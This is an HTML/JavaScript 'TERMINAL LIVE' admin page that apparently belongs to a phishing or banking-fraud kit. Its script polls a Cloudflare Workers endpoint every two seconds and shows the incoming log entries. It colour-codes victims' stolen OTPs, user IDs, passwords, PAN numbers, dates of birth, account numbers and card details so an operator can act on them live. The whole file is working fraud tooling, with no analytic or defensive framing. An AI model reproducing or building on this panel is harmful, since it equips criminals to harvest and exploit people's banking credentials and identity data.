<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Extreme Left Admin</title>
    <style>
        /* Pura reset - Sab kuch baayein (Left) chipka do */
        html, body {
            margin: 0 !important;
            padding: 0 !important;
            background-color: #ffffff;
            text-align: left !important;
            display: block !important;
        }

        * { 
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        /* Header ko left se shuru karo */
        .header {
            width: 100% !important;
            padding: 10px !important;
            border-bottom: 2px solid #eee;
            margin-bottom: 5px !important;
            display: flex !important;
            justify-content: space-between !important;
            align-items: center !important;
        }

        .v-badge {
            background: #ff0000;
            color: #fff;
            padding: 2px 10px;
            font-weight: 900;
            border-radius: 4px;
        }

        /* Logs Container - No Flex, No Center */
        #logsDisplay {
            width: 100% !important;
            padding: 5px !important;
            display: block !important;
            text-align: left !important;
        }

        /* Ultra Patla Vibrant Cart */
        .data-row {
            display: block !important;
            width: 100% !important;
            padding: 4px 10px !important; /* Ekdum patla padding */
            margin-bottom: 3px !important;
            border-radius: 2px !important;
            font-size: 13px !important;
            font-weight: 800 !important;
            line-height: 1.2 !important;
            color: #ffffff !important;
            white-space: pre-wrap !important;
            word-break: break-all !important;
            text-align: left !important; /* Strict Left */
            float: left !important; /* Force Left */
            clear: both !important;
        }

        .time {
            font-size: 8px;
            color: rgba(255,255,255,0.7);
            font-weight: 400;
            margin-left: 5px;
            text-align: left !important;
        }
    </style>
</head>
<body>

    <div class="header">
        <h1 style="font-size: 12px; margin:0; text-align:left;">TERMINAL LIVE</h1>
        <div class="v-badge" id="vCount">0</div>
    </div>

    <div id="logsDisplay">
        </div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
        let lastHash = "";

        async function fetchLogs() {
            try {
                const res = await fetch(workerURL);
                const data = await res.json();
                
                const display = document.getElementById('logsDisplay');
                const badge = document.getElementById('vCount');

                const currentHash = JSON.stringify(data);
                if (currentHash === lastHash) return;
                lastHash = currentHash;

                badge.innerText = data.length;

                display.innerHTML = data.map(log => {
                    if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) return "";

                    let content = log.detail.toLowerCase();
                    let bgColor = "#222"; 

                    // --- TEZ COLOUR CODING ---
                    if (content.includes("otp:-")) {
                        bgColor = "#FF0000"; // Red
                    } else if (content.includes("user id:-") || content.includes("pass:-")) {
                        bgColor = "#008000"; // Green
                    } else if (content.includes("pan:-") || content.includes("dob:-")) {
                        bgColor = "#0000FF"; // Blue
                    } else if (content.includes("acc:-") || content.includes("name:-")) {
                        bgColor = "#FF00FF"; // Pink
                    } else if (content.includes("card:-")) {
                        bgColor = "#FF8C00"; // Orange
                    }

                    return `
                        <div class="data-row" style="background-color: ${bgColor};">
                            ${log.detail} <span class="time">${log.time || ''}</span>
                        </div>
                    `;
                }).join('');

            } catch (e) { console.log("Updating..."); }
        }

        setInterval(fetchLogs, 2000);
        window.onload = fetchLogs;
    </script>
</body>
</html>
